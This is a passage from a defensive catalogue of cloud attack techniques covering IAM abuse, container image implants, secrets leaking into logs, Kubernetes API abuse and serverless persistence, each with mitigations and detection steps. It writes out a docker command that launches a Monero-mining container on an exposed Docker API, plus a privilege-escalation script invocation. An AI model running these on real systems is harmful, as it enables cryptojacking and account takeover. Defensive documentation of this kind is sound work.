|  | AWS | To manage the access that privileged accounts have on the AWS cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the IAM limited administrator would be used. This is done by creating a policy that gives a user admin rights, but disallows the other actions using the AWS command line interface. This is outlined at:[**https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/**](https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/)**.** |
|  | Azure | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the specific administrative needs can be picked from a number of options available (Azure DevOps Administrator, Billing Administrator, Cloud Application Administrator, etc.) These different options can be edited to fit the needs and limit the basic access. This is outlined at:[**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles**](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles)**.** |
|  | GCP | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account pre-defined administrator accounts can be used (mobile admin, Google voice admin, help desk admin, etc.). These accounts can be used with their pre-defined settings, or modified depending on specific use cases. These can limit access to basic functionality needed. This is outlined at:**https://support.google.com/a/answer/2405986?hl=en.** |
| [User Account Management](https://attack.mitre.org/mitigations/M1018) | | Ensure users and user groups have appropriate permissions for their roles through Identity and Access Management (IAM) controls. Configure user permissions, groups, and roles for access to cloud-based systems. Implement strict IAM controls to prevent access to systems except for the applications, users, and services that require access. Consider using temporary credentials that are only good for a certain period of time in cloud environments to reduce the effectiveness of compromised accounts. |
| Honey Tokens | | Create accounts credentials with no inherent rights that will be noticed in CloudTrail or Monitor and indicate malicious activity. |


Detection


Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).


Perform regular audits of cloud accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials, and if any are discovered, they should be updated immediately.


References


1.https://github.com/NetSPI/MicroBurst/blob/master/Az/Get-AzPasswords.ps1. Accessed May 16, 2020


# IAM Abuse(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Both Azure and AWS employ IAM functionality that assigns specific resource roles to either users, groups, or service principals in an attempt to limit permissions to only those required to perform required tasks. Using the credentials of any user or service principal, cloud API’s can be used to scan all available roles that may have been assigned. Because of the hundreds/thousands of roles available, administrators may not realize or remember which roles are assigned to whom. Even AWS can get confused, in 2018 AWS released a recommended managed policy that inadvertently allowed any user assigned this role the ability to grant all accesses to all AWS account resources.


Adversaries can use tools such as Pacu to discover obscure role assignments and use these accesses to further infiltrate the cloud infrastructure.


Examples




| **Name** | **Description** |
| --- | --- |
| iam\_\_privesc\_scan | Abuses AWS API to list all roles an account has been granted and suggests further actions based on these roles. |
| Validate\_iam\_principals.py | Open source Module that scans for available IAM roles in a given account. |
| AmazonElasticTranscoderFullAccess | Abuses flaw in AWS IAM managed policy to enable assignment of arbitrary permissions to any other IAM role. |
| aws\_escalate.py | AWS\_escalate.py is a script written by Rhino Security Labs that detects over 20 possible privilege escalation methods within an AWS environment when provided with an access key and secret key. For example,*python3 aws\_escalate.py –all-users –access-key-id ABCDEFGHIJK –secret-key hdj6kshakl31/1asdhui1hka*will check privilege escalation methods for all users. |
| PowerZure | PowerZure is a GitHub project that automates the process of assessing and exploiting resources and misconfigurations within Azure. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud.Frequently check role assignments to ensure proper permissions are set and still required. Consider using automated role checkers. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Azure Access Review | | Consider using account audit functionality periodically to ensure rights are still required by various accounts. |
| Setting IAM Policies and Permissions | | Implement least privilege and assign roles and permissions to users as necessary. |
|  | AWS | Amazon’s article for IAM security best practices in AWS covers topics including creating individual IAM users, using AWS managed policies, roles, frequent key rotation and others. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html.** |
|  | Azure | Microsoft’s article for IAM security best practices in Azure covers topics including centralizing identity management, turning on conditional access, use role-based access control, using Azure AD for storage authentication, and others. Full details can be found at[**https://docs.microsoft.com/en-us/azure/security/fundamentals/identity-management-best-practices**](https://docs.microsoft.com/en-us/azure/security/fundamentals/identity-management-best-practices)**.** |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |


References


1.<https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details>. Accessed Feb 12, 2020.


2.Sharath AV AWS Security Flaw which can grant admin access! https://medium.com/ymedialabs-innovation/an-aws-managed-policy-that-allowedgranting-root-admin-access-to-any-role-51b409ea7ff0. Accessed February 13, 2020.


3.https://github.com/dagrz/aws\_pwn/tree/master/reconnaissance. Accessed Feb 20, 2020.


4.<https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/>. Accessed July 21, 2020.


5.<https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a>. Accessed July 21, 2020.


6.<https://github.com/hausec/PowerZure>. Accessed July 21, 2020.


7.<https://blog.netspi.com/attacking-azure-cloud-shell/>. Accessed July 30, 2020.


8.<https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html>. Accessed August 3, 2020.


9.<https://docs.microsoft.com/en-us/azure/security/fundamentals/identity-management-best-practices>. Accessed August 3, 2020.


# Implant Container Image(version 1.0)


**Cloud Service Label: IaaS**


Description


Amazon Web Service (AWS) Amazon Machine Images (AMI), and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored to include malicious code. Depending on how the infrastructure is provisioned, this could provide initial or persistent access.


For example, a publicly accessible tool has been developed to facilitate planting backdoors in AWS Docker container images. If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a web shell. Adversaries may also implant Docker images that may be inadvertently used in cloud deployments especially with cluster management services like Kubernetes. Kubernetes will grab new container images from a configured repository and run them dynamically. If a malicious image makes it into the container registry, an adversary can be reasonably sure it will eventually be run by a newly launched Kubernetes node.


Examples




| **Name** | **Description** |
| --- | --- |
| Cryptojacking Campaign | On November 24, 2019, a cryptojacking campaign exploited Docker API endpoints to mine Monero. This was done by deploying an Alpine Linux OS container to the exposed Docker API that runs a malicious script from the attackers’ servers and installs a Monero miner. Launching a mining container is as easy as*docker -H 192.168.1.7:2376 run --restart unless-stopped --read-only -m 50M -c 512 bitnn/alpine-xmrig-o POOL01 -o POOL02 -u WALLET -p PASSWORD -k* |
| GCP Custom Cloud Shell Image | After obtaining a shell on the host of a container, a malicious Docker image can be built to steal contents from a user’s home folder. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Code Signing | | Several cloud service providers support content trust models that require container images be signed by trusted sources. |
| Least Privilege | | All access given to users in the cloud environment should be assigned by the necessary privileges needed for team members to complete their job responsibilities.Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary . |
|  | AWS | To implement least privilege in an AWS environment IAM policies will be used. This gives the ability to allow users to perform list, read, write, permissions management, or tagging actions. AWS suggests utilizing*last accessed information*and A*WS CloudTrail event history*to get a better understanding of privileges that might be needed or reduced based on a specific role. Full details can be found at**https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege.** |
|  | Azure | To implement least privilege in an Azure environment Azure Active Directory roles will be used. Azure outlines different tasks and the least privileged role that are suggested to be associated with the task. Those details can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/roles-delegate-by-task.**To learn how to assign specific roles it can be done via the Azure Active Directory Portal. Instructions on how to assign roles can be found here:**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-manage-roles-portal.** |
|  | GCP | To implement least privilege in GCP it is recommended to use predefined roles (which allow for granular access permissions) instead of primitive roles (roles/owner, roles/editor, and roles/viewer). Full details on the difference between types of roles can be found here:**https://cloud.google.com/iam/docs/understanding-roles.**To assign these roles IAM service accounts are used and complete details can be found at:**https://cloud.google.com/iam/docs/using-iam-securely#least\_privilege.** |
| Privileged Account Management | | Do not allow subscription-level administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems. |
|  | AWS | To manage the access that privileged accounts have on the AWS cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the IAM limited administrator would be used. This is done by creating a policy that gives a user admin rights, but disallows the other actions using the AWS command line interface. This is outlined at:[**https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/**](https://aws.amazon.com/blogs/security/how-to-create-a-limited-iam-administrator-by-using-managed-policies/)**.** |
|  | Azure | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account the specific administrative needs can be picked from a number of options available (Azure DevOps Administrator, Billing Administrator, Cloud Application Administrator, etc.) These different options can be edited to fit the needs and limit the basic access. This is outlined at:[**https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles**](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles)**.** |
|  | GCP | To manage the access that privilege accounts have on the Azure cloud system to only allow administrators to perform administrative tasks on such accounts can be accomplished utilizing limited IAM administrator accounts. To configure this the administrator would have two accounts; one would have administrative rights and no basic access while the other account has basic access with no administrative rights. To limit the administrative account pre-defined administrator accounts can be used (mobile admin, Google voice admin, help desk admin, etc.). These accounts can be used with their pre-defined settings, or modified depending on specific use cases. These can limit access to basic functionality needed. This is outlined at:**https://support.google.com/a/answer/2405986?hl=en.** |
| Use Private Container Repos | | Retrieving a container from Docker Hub does not mean that the container image is free from vulnerabilities or malware! Pointing cluster management software to fetch containers from repos outside an organization’s direct control tacitly permits access to everyone who can add content to that repo. |


Detection


If an automated scanning tool does not flag something suspicious in an image, it will be difficult to detect malicious behavior inserted into one of the many processes running inside the container. However, it should be possible to detect any network connections a container is making unexpectantly which could indicate a backdoor is being initiated.




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.[Rhino Labs. (2019, August). Exploiting AWS ECR and ECS with the Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019.](https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/)


2.[Rhino Labs. (2019, September). Cloud Container Attack Tool (CCAT). Retrieved September 12, 2019.](https://github.com/RhinoSecurityLabs/ccat)


3.[Doman, C. & Hegel, T.. (2019, March 14). Making it Rain - Cryptocurrency Mining Attacks in the Cloud. Retrieved October 3, 2019.](https://www.alienvault.com/blogs/labs-research/making-it-rain-cryptocurrency-mining-attacks-in-the-cloud)


4.[Microsoft. (2019, September 5). Content trust in Azure Container Registry. Retrieved October 16, 2019.](https://docs.microsoft.com/en-us/azure/container-registry/container-registry-content-trust)


5.[Docker. (2019, October 10). Content trust in Docker. Retrieved October 16, 2019.](https://docs.docker.com/engine/security/trust/content_trust/)


6.[CoinTelegraph. (2019, November). Helen Partz - Hackers Mass-Scanning Web for Docker Platforms to Mine Cryptocurrencies. Retrieved July 14, 2020.](https://cointelegraph.com/news/hackers-mass-scanning-web-for-docker-platforms-to-mine-cryptocurrencies)


7.<https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124>. Accessed July 14, 2020.


8.<https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-2/>. Accessed July 29, 2020.


# Insertion of Sensitive Information into Log File (combined with Collection from Cloud Logs)


(version 1.0)


**Cloud Service Label: IaaS**


Description


Adversaries may be able to use the cloud’s extensive logging capabilities, and the information written to them, as a way to gain information/access to a system. Ultimately, this can lead to the adversary gaining access to user data of a sensitive nature. Logging is essential for many aspects of day to day operations but logging of all information is not always necessary once a system is in production. Some types of log files that can be utilized are server log files, debugging logs, plugin logs, etc.


Examples




| **Name** | **Description** |
| --- | --- |
| CVE-2020-7599 | Adversaries may exploit a vulnerability in com.gradle.plugin-publish versions prior to 0.11.0 where an author publishes a plugin where the build log is public and the –info flag is used. Under these circumstances the build log will contain an AWS pre-signed URL that would allow an adversary to access the pre-signed URL, of a plugin that was recently uploaded, and replace it with their own plugin. |
| CVE-2019-4284 | IBM Cloud Private versions 2.1.0, 3.1.0, 3.1.1, and 3.1.2 contain a vulnerability that allows a local privileged user to view OpenID Connect tokens that could be printed to log files. These tokens could be utilized to log into the system as other users. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Log Configurations | Make the decision on what is necessary to be logged and what is not. |
| Log File Permissions | Make sure that log files have permissions in place to avoid unauthorized read/write access. |
| AWS CIS Benchmark Standards | Refer to the logging section of the AWS CIS Benchmark Standards. These include ensuring CloudTrail is enabled in all regions, enabling log file validation, removing public access to S3 buckets, encrypting CloudTrail logs at rest using KMS CMKs, and enabling VPC flow logging in all VPCs, and integrating CloudTrail trails with CloudWatch Logs. |
| AWS CloudWatch Logs Documentation | IAM Identities (identity-based policies) can be attached to specific writing permissions policies. CloudWatch Log policies use AWS condition keys to express conditions. |
| Azure CIS Benchmark Standards | Refer to the logging section of the Azure CIS Benchmark Standards. These include ensuring that activity logs for storage containers are not publicly accessible and that they are encrypted with BYOK (Bring Your Own Key) |


Detection




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for CloudTrail to detect illicit logins and access | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create, View, and Manage Activity Alerts in Azure Monitor to detect illicit logins and access | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window **3.**Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option **7.**Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |


References


1.[CWE. (Feb 20, 2020). CWE-532: Insertion of Sensitive Information into Log File. Retrieved June 9, 2020.](https://cwe.mitre.org/data/definitions/532.html)


2.[CVE. (Jan 21, 2020). CVE-2020-7599. Retrieved June 9, 2020.](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7599)


3.<https://d0.awsstatic.com/whitepapers/compliance/AWS_CIS_Foundations_Benchmark.pdf>. Accessed July 27, 2020.


4.<https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/permissions-reference-cwl.html>. Accessed July 27. 2020.


5.<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-4284>. Accessed August 6, 2020.


6.<https://docs.microsoft.com/en-us/azure/azure-monitor/platform/alerts-activity-log>. Accessed August 6, 2020.


7.<https://docs.microsoft.com/en-us/azure/azure-monitor/platform/alerts-metric-create-templates#template-for-a-metric-alert-that-monitors-multiple-resources>. Accessed August 6, 2020.


# Kubernetes API Abuse(version 1.0)


**Cloud Service Label: IaaS, PaaS**


Description


Cloud workloads are becoming more and more dependent on Kubernetes. Kubernetes is a complex piece of software with a rich and complex API that can be exposed inadvertently through simple misconfigurations. Even when not misconfigured, it can still introduce access opportunities for attackers. In 2018 (CVE-2018-1002105), the first major vulnerability was reported that could compromise the integrity of an entire Kubernetes cluster due to a flaw in the Kubernetes API. Since then several other flaws have been discovered within the Kubernetes API with varying degrees of severity. The remediation in every case has been to upgrade Kubernetes to the latest version. This however may become more problematic as more cloud workloads rely on Kubernetes clusters to handle workloads with strict uptime requirements. If past is prologue, new critical API vulnerabilities can be expected in the coming years. Similar to the Kubernetes API but distinct is the Kubectl command line utility that can also control a Kubernetes cluster. Key vulnerabilities have begun to be found in this software also that could enable an adversary with some cloud console access to increase his capabilities.


Examples




| **Name** | **Description** |
| --- | --- |
| CVE-2019-1002101 | Allowed adversaries to inject random code running at the privileges of a container if they could simply replace the tar binary in any running container with an executable named tar. |


Mitigations




| **Mitigation** | **Description** |
| --- | --- |
| Limit API Server Access | Ensure the API server is accessible only from trusted subnets in a Virtual network. |
| No Anonymous Authentication | Ensure that anonymous authentication is disabled. |
| Periodic Vulnerability Scanning | Periodically use a Kubernetes vulnerability scanner on any Kubernetes clusters deployed on IaaS. |


Detection


Monitor Kubernetes cluster activity to locate unexplained stoppage and starting of containers which could be indicative of adversary experimentation utilizing the Kubernetes API.




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.<https://www.stackrox.com/post/2020/01/top-5-kubernetes-vulnerabilities-of-2019-the-year-in-review/>- Accessed March 8,2020


2.https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware – Accessed March 8, 2020


3.<https://github.com/aquasecurity/kube-hunter>- Accessed March 8, 2020


# Creating New FaaS - AWS Lambda/Azure Logic Apps(version 1.0)


**Cloud Service Label: PaaS**


Description


Both Azure and AWS employ “serverless” code functionality that can be set to automatically trigger by other events within the cloud API. Such functionality is often not associated with an avenue for persistence However, it is fairly straightforward for someone with privileges to set up a trigger and a serverless function. In this way an adversary with temporary access could set up a function for example to send a copy of access keys to an outside controlled web address every time a new user account is created. Thus ensuring continued access even after an initial compromise is discovered and remediated. Because serverless code is essentially an ephemeral PaaS service, traditional methods to scan code for vulnerabilities before execution are not very applicable currently.


Examples




| **Name** | **Description** |
| --- | --- |
| Aws\_Pwn | Publicly available module that allows creation of AWS lambda function triggered by user account creation. |


Mitigations




| **Mitigation** | | **Description** |
| --- | --- | --- |
| Audit | | Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources. Consider using automated resource checkers such as CloudSploit or Divvycloud.Frequently check API logs for lambda/function creation events. |
|  | AWS | To perform an audit via AWS it is suggested to review information such as account details (credentials, users, groups, roles, etc), mobile applications, EC2 configurations, policies, and account activity. How to audit these different factors can be found in detail at:**https://docs.aws.amazon.com/general/latest/gr/aws-security-audit-guide.html.** |
|  | Azure | To perform an audit via Azure an administrator can review the audit logs that are recorded under Azure’s monitoring for active directory. The audit logs allow for filtering, as well as looking at users, groups, and enterprise specific information. Full details on how to access this information can be found at:**https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-audit-logs.** |
|  | GCP | To perform an audit via GCP the logs can be reviewed. GCP breaks this down into three categories; admin activity, data access, and system events. The audit logs can be viewed a few different ways- the console, API, or gcloud. Full details on how to view these logs, how to export, and for how to configure the retention period can be found here:**https://cloud.google.com/logging/docs/audit.** |
| Policy | | In Azure apply policy “Diagnostic logs in Logic Apps should be enabled” to the scope of all subscriptions to ensure any created logic apps must create and deliver logs to a monitoring solution. |


Detection


CloudTrail or Monitor may record accesses to the cloud API when changes are made to functions.




| **Detection** | **Description** |
| --- | --- |
| Create Log Metric Filters and Alarms for AWS | To create a metric filter and alarm: 1.Create a metric filter that checks for IAM policy changes and the*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter and SNS topic created in steps 1 and 2 respectively |
| Monitor Activity in AWS Account | Various services in AWS offer logging features that allow for detection capabilities. These include CloudFront, CloudTrail, CloudWatch, Config, and S3. |
| Monitor for Suspicious Activity in Azure | Azure AD can generate anomaly reports than can be run on a daily basis. Azure AD Identity Protection show current risks in its dashboard and provides daily email summary notifications. Policies can also be configured to alert to specific issues. |
| Create Log Metric Filters and Alarms for CloudTrail | To create a metric filter and alarm: 1.Create a filter that checks for CloudTrail changes and the specific*<cloudtrail\_log\_group\_name>* 2.Create an SNS topic that the alarm will notify 3.Create an SNS subscription to the above topic 4.Create an alarm associated with the filter from step 1 and SNS topic in step 2 |
| Create Activity Log Alerts in Azure | To create log activity alerts for deletion in the Azure Console: 1.Navigate to*Monitor’ / ‘Alerts* 2.Select*Manage alert rules* 3.Click on the Alert*Name*where Condition contains*operationName equals Microsoft.Network/networkSecurityGroups/securityRules/delete* 4.Hover a mouse over*Condition*to ensure it is set to*Whenever the Administrative Activity Log “Delete Security Rule (networkSecurityGroups/securityRules)” has “any” level with “any” status and event is initiated by “any*” |
| Create, View, and Manage Activity Alerts in Azure Monitor | To create a log alert in the Azure portal: 1.Select**Monitor -> Alerts** 2.Select**New alert rule**of the**Alerts**window 3.Provide information in**Define alert condition** 4.Provide details in**Define alert details** 5.Specify action group for new alert rule under**Action group**, or create a new action group with +**New group** 6.Select**Yes**for the**Enable rule upon creation**option 7.Select**Create alert rule** To view and manage alerts: 1.Select**Monitor -> Alerts -> Manage alert rules** 2.Select the rule you want to modify and double-click to edit the rule options 3.Click**Save** |
| Azure Resource Manager Templates | Azure Resource Manager templates in the format of JSON files that can be used to configure metric alerts in Azure Monitor. These templates can be used for simple static and dynamic threshold metric alerts, availability tests, and monitoring multiple resources. |
| Enable CloudTrail across all regions in AWS | To enable CloudTrail across all regions: 1.Sign into the AWS Management Console and open the CloudTrail console 2.Click on*Trails* 3.Set necessary Trails to All option in the I column 4.Click on a trail via the link*Name*column 5.Set*Logging*to*ON* 6.Set*Apply trail to all regions*to*Yes* |
| Configure log profile to capture activity logs for all regions in Azure | To set up activity logs for all regions: 1.Navigate to Azure console 2.Go to*Activity log* 3.Select*Export* 4.Select*Subscription* 5.Check*Select all*in*Regions* 6.Select*Save* |


References


1.https://github.com/dagrz/aws\_pwn/blob/master/persistence/backdoor\_created\_users\_lambda/backdoor\_created\_users\_lambda.py. Accessed Feb 20, 2020.


2. https://github.com/puresec/sas-top-10. Accessed Feb 20, 2020.


# Leveraging Cloud Shells(version 1.0)


